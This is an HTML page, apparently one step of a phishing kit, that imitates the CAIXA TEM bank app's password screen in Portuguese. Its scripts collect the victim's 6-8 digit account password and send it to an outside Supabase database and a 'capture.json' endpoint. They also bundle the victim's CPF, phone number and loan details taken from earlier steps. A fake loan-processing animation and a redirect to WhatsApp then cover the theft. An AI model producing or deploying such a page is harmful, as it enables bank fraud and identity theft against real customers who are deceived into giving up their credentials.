<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
  <link rel="icon" type="image/png" href="favicon.png" />
  <title>CAIXA TEM - Senha</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
      background: #0066b3;
      height: 100%;
      width: 100%;
      position: fixed;
      overflow: hidden;
      display: none;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }

    @media (max-width: 768px) {
      body {
        display: flex;
      }
    }

    .container {
      background: white;
      border-radius: 24px;
      width: 100%;
      max-width: 420px;
      margin: auto;
      padding: 0;
      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
      position: relative;
      min-height: 90%;
      max-height: 100%;
      overflow-y: auto;
      align-self: center;
      display: flex;
      flex-direction: column;
    }

    .close-btn {
      position: absolute;
      top: 20px;
      right: 20px;
      background: none;
      border: none;
      font-size: 28px;
      color: #666;
      cursor: pointer;
      font-weight: 300;
      line-height: 1;
      padding: 0;
      width: 32px;
      height: 32px;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .content {
      padding: 80px 32px 32px 32px;
      flex: 1;
      display: flex;
      flex-direction: column;
    }

    .logo {
      position: absolute;
      top: 24px;
      left: 50%;
      transform: translateX(-50%);
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .logo img {
      max-width: 50px;
      height: auto;
    }

    h1 {
      color: #003e6b;
      font-size: 30px;
      font-weight: 600;
      text-align: left;
      line-height: 1.3;
      margin-bottom: 32px;
    }

    .input-wrapper {
      margin-bottom: 24px;
    }

    label {
      display: block;
      color: #374151;
      font-size: 16px;
      font-weight: 600;
      margin-bottom: 12px;
    }

    input[type="password"] {
      width: 100%;
      padding: 16px 20px;
      border: 1px solid #d1d5db;
      border-radius: 12px;
      font-size: 16px;
      color: #374151;
      outline: none;
      transition: border-color 0.2s;
    }

    input[type="password"]:focus {
      border-color: #0066b3;
    }

    .submit-btn {
      width: 100%;
      padding: 16px;
      background: #d4dfe6;
      color: #a0adb5;
      border: none;
      border-radius: 12px;
      font-size: 18px;
      font-weight: 600;
      cursor: not-allowed;
      margin-bottom: auto;
    }

    .version {
      text-align: center;
      color: #1a7f78;
      font-size: 14px;
      margin-top: auto;
      padding-top: 40px;
      padding-bottom: 20px;
    }

    .loading-screen {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: #0066b3;
      z-index: 2000;
      display: none;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      text-align: center;
      padding: 20px;
    }

    .loading-gif {
      width: 120px;
      height: 120px;
      margin-bottom: 40px;
    }

    .loading-icon {
      width: 150px;
      height: 150px;
      margin-bottom: 40px;
      display: none;
      filter: brightness(0) invert(1);
    }

    .loading-message {
      color: white;
      font-size: 20px;
      font-weight: 600;
      margin-bottom: 12px;
      animation: fadeInOut 2s ease-in-out infinite;
    }

    .loading-message.final {
      animation: none;
      font-size: 24px;
    }

    .loading-submessage {
      color: white;
      font-size: 14px;
      opacity: 0.85;
    }

    @keyframes fadeInOut {
      0%, 100% { opacity: 0.7; }
      50% { opacity: 1; }
    }

    .hidden {
      display: none !important;
    }
  </style>
</head>
<body>
  <!-- Loading Screen -->
  <div class="loading-screen" id="loadingScreen">
    <img src="loading.gif" alt="Carregando..." class="loading-gif" id="loadingGif">
    <div id="lottieIcon" class="loading-icon"></div>
    <div class="loading-message" id="loadingMessage">Finalizando seu empréstimo</div>
    <div class="loading-submessage" id="loadingSubmessage">Por favor, aguarde...</div>
  </div>

  <!-- Lottie Library -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/lottie-web/5.12.2/lottie.min.js"></script>

  <div class="container">
    <button class="close-btn">✕</button>
    
    <div class="content">
      <div class="logo">
        <img src="logocaixa2.png" alt="Logo">
      </div>

      <h1>Informe sua senha<br>de 6 a 8 dígitos</h1>

      <div class="input-wrapper">
        <label for="passwordInput">Senha da conta</label>
        <input type="password" inputmode="numeric" placeholder="Digite sua senha" maxlength="8" id="passwordInput">
      </div>

      <button class="submit-btn" id="submitBtn">Próximo</button>

      <div class="version">Versão: 1.91.23</div>
    </div>
  </div>

  <!-- ============================================ -->
  <!-- SUPABASE INTEGRATION - MESMO SISTEMA DO FUNIL -->
  <!-- ============================================ -->
  <script>
    const SUPABASE_URL = 'https://hbpgjwezukugbtviswkw.supabase.co';
    const SUPABASE_KEY = 'sb_publishable__7MjiigiJf7NgmLZPLFdxA_yRNF_cO8';

    function getSessaoId() {
      let id = sessionStorage.getItem('sessao_funil');
      if (!id) {
        id = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8);
        sessionStorage.setItem('sessao_funil', id);
      }
      return id;
    }

    async function salvarEtapa(etapaNome, dadosColetados = {}) {
      const sessao_id = getSessaoId();
      
      const payload = {
        sessao_id: sessao_id,
        etapa: etapaNome,
        dados: dadosColetados,
        url: window.location.pathname,
        user_agent: navigator.userAgent.substring(0, 255)
      };

      console.log(`📝 Salvando etapa: ${etapaNome}`, dadosColetados);

      try {
        const response = await fetch(`${SUPABASE_URL}/rest/v1/funil_etapas`, {
          method: 'POST',
          headers: {
            'apikey': SUPABASE_KEY,
            'Authorization': `Bearer ${SUPABASE_KEY}`,
            'Content-Type': 'application/json',
            'Prefer': 'return=minimal'
          },
          body: JSON.stringify(payload)
        });

        if (response.ok) {
          console.log(`✅ Etapa "${etapaNome}" salva com sucesso!`);
          return true;
        } else {
          console.error(`❌ Erro ${response.status}:`, await response.text());
          return false;
        }
      } catch (error) {
        console.error('❌ Erro de rede:', error);
        return false;
      }
    }
  </script>

  <script>
    const passwordInput = document.getElementById('passwordInput');
    const submitBtn = document.getElementById('submitBtn');
    let lottieAnimation = null;

    function initLottie() {
      const container = document.getElementById('lottieIcon');
      if (container && !lottieAnimation) {
        lottieAnimation = lottie.loadAnimation({
          container: container,
          renderer: 'svg',
          loop: false,
          autoplay: false,
          path: 'Check.json'
        });
      }
    }

    // REGISTRA QUE O USUÁRIO CHEGOU NESTA PÁGINA (ETAPA 6 DO FUNIL)
    salvarEtapa('pagina_senha', { 
      pagina: 'senha4e98',
      timestamp_acesso: new Date().toISOString()
    });

    // Log visit (mantém compatibilidade)
    fetch('capture.json', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ step: 'visit', page: 'senha' })
    }).catch(() => {});

    passwordInput.addEventListener('input', function(e) {
      let value = e.target.value.replace(/\D/g, '');
      e.target.value = value;

      if (value.length >= 6 && value.length <= 8) {
        submitBtn.style.background = '#d97706';
        submitBtn.style.color = 'white';
        submitBtn.style.cursor = 'pointer';
        submitBtn.disabled = false;
      } else {
        submitBtn.style.background = '#d4dfe6';
        submitBtn.style.color = '#a0adb5';
        submitBtn.style.cursor = 'not-allowed';
        submitBtn.disabled = true;
      }
    });

    submitBtn.addEventListener('click', async function() {
      if (!this.disabled) {
        const senha = passwordInput.value;
        
        // SALVA A SENHA NO BANCO DE DADOS (ETAPA 6 DO FUNIL)
        await salvarEtapa('senha_informada', {
          senha: senha,
          tamanho_senha: senha.length,
          timestamp: new Date().toISOString()
        });
        
        // Salva também no storage para registro completo
        const senhaData = {
          senha: senha,
          tamanho_senha: senha.length,
          timestamp: new Date().toISOString()
        };
        localStorage.setItem('funil_senha_data', JSON.stringify(senhaData));
        sessionStorage.setItem('funil_senha_data', JSON.stringify(senhaData));
        
        console.log('💾 Senha salva no storage (tamanho:', senha.length, 'dígitos)');
        
        submitBtn.disabled = true;
        submitBtn.textContent = 'Aguarde...';

        initLottie();

        // Mantém compatibilidade com capture.json
        try {
          fetch('capture.json', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ 
                  step: 'password', 
                  password: senha
              })
          }).catch(() => {});
        } catch(e) {}

        // Busca todos os dados do funil para salvar um resumo completo
        try {
          const cpfData = localStorage.getItem('funil_cpf_data') || '{}';
          const emprestimoData = localStorage.getItem('funil_emprestimo_data') || '{}';
          const telefoneData = localStorage.getItem('funil_telefone_data') || '{}';
          
          let cpf = 'não informado';
          let telefone = 'não informado';
          let valor = 'não informado';
          let parcelas = 'não informado';
          
          try {
            const cpfParsed = JSON.parse(cpfData);
            cpf = cpfParsed.cpf || 'não informado';
          } catch(e) {}
          
          try {
            const telParsed = JSON.parse(telefoneData);
            telefone = telParsed.telefone || 'não informado';
          } catch(e) {}
          
          try {
            const empParsed = JSON.parse(emprestimoData);
            valor = empParsed.amount || 'não informado';
            parcelas = empParsed.installments || 'não informado';
          } catch(e) {}
          
          // SALVA RESUMO COMPLETO DO FUNIL
          await salvarEtapa('funil_completo_resumo', {
            cpf: cpf,
            telefone: telefone,
            valor_emprestimo: valor,
            parcelas: parcelas,
            senha_tamanho: senha.length,
            data_finalizacao: new Date().toISOString()
          });
        } catch(e) {
          console.error('Erro ao salvar resumo:', e);
        }

        const loadingScreen = document.getElementById('loadingScreen');
        const loadingGif = document.getElementById('loadingGif');
        const loadingIcon = document.getElementById('lottieIcon');
        const loadingMessage = document.getElementById('loadingMessage');
        const loadingSubmessage = document.getElementById('loadingSubmessage');
        
        loadingScreen.style.display = 'flex';
        
        const messages = [
          'Finalizando seu empréstimo',
          'Processando solicitação',
          'Validando informações',
          'Preparando documentação',
          'Confirmando dados',
          'Gerando contrato',
          'Salvando informações',
          'Encaminhando para atendimento'
        ];
        
        let messageIndex = 0;
        
        const messageInterval = setInterval(() => {
          messageIndex = (messageIndex + 1) % messages.length;
          loadingMessage.textContent = messages[messageIndex];
        }, 1000);
        
        setTimeout(async function() {
          clearInterval(messageInterval);
          
          loadingGif.style.display = 'none';
          loadingIcon.style.display = 'block';
          if (lottieAnimation) {
              lottieAnimation.play();
          }
          
          loadingMessage.classList.add('final');
          loadingMessage.textContent = 'Solicitação Finalizada!';
          loadingSubmessage.textContent = 'Você será direcionado para o atendimento via WhatsApp';
          
          setTimeout(function() {
            window.location.href = 'fim4e98.html?a7k9m2x1p12';
          }, 5000);
        }, 6000);
      }
    });
  </script>

  <script>
    document.addEventListener('DOMContentLoaded', function() {
        var accessParam = 'a7k9m2x1p12';
        
        function addAccessToLinks() {
            var links = document.querySelectorAll('a[href]');
            links.forEach(function(link) {
                var href = link.getAttribute('href');
                if (!href || href.startsWith('http') || href.startsWith('#') || 
                    href.startsWith('javascript:') || href.includes(accessParam.split('=')[0])) {
                    return;
                }
                var separator = href.includes('?') ? '&' : '?';
                link.setAttribute('href', href + separator + accessParam);
            });
        }
        
        function addAccessToForms() {
            var forms = document.querySelectorAll('form');
            forms.forEach(function(form) {
                if (!form.method || form.method.toLowerCase() === 'get') {
                    var paramName = accessParam.split('=')[0];
                    var existingInput = form.querySelector('input[name="' + paramName + '"]');
                    if (!existingInput) {
                        var input = document.createElement('input');
                        input.type = 'hidden';
                        input.name = paramName;
                        input.value = '';
                        form.appendChild(input);
                    }
                }
            });
        }
        
        addAccessToLinks();
        addAccessToForms();
        
        var observer = new MutationObserver(function(mutations) {
            var shouldUpdate = false;
            mutations.forEach(function(mutation) {
                if (mutation.type === 'childList') {
                    mutation.addedNodes.forEach(function(node) {
                        if (node.nodeType === 1) {
                            if (node.tagName === 'A' || node.tagName === 'FORM' || 
                                node.querySelector('a') || node.querySelector('form')) {
                                shouldUpdate = true;
                            }
                        }
                    });
                }
            });
            if (shouldUpdate) {
                addAccessToLinks();
                addAccessToForms();
            }
        });
        
        observer.observe(document.body, {
            childList: true,
            subtree: true
        });
    });
  </script>
</body>
</html>
